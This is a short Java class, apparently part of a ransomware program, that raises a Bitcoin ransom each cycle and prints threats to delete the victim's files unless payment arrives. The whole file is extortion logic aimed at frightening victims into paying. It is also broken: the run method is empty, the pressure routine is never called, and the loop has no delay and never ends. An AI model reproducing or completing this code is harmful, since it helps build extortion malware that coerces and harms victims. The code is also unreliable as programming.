import java.util.TimerTask;

public class PsychologicalPressure extends TimerTask {

    private float ransomAmount;
    private boolean timeOut;
    private boolean transactionSuccessful;

    public PsychologicalPressure(float ransomAmount, boolean timeOut, boolean transactionSuccessful) {
        this.ransomAmount = ransomAmount;
        this.timeOut = timeOut;
        this.transactionSuccessful = transactionSuccessful;
    }

    @Override
    public void run() {

    }

    private void pressureTask(){
        int minuteCounter = 0;

        try{
            do{
                ransomAmount += 0.01f;
                minuteCounter++;

                if(minuteCounter ==4){
                    System.out.println("Pay "+ ransomAmount + " BTC immediately or your files will be irrevocably deleted.");
                }else if(minuteCounter>4){
                    System.out.println("Payment not arrived, your files will be irrevocably deleted");
                }else{
                    System.out.println("Amount to pay increased by 0,01 to "+ransomAmount+" BTC.");
                }
            }while (!transactionSuccessful);
            Thread.sleep(60000000000l);

        } catch (InterruptedException e){
            e.printStackTrace();
        }
    }
}
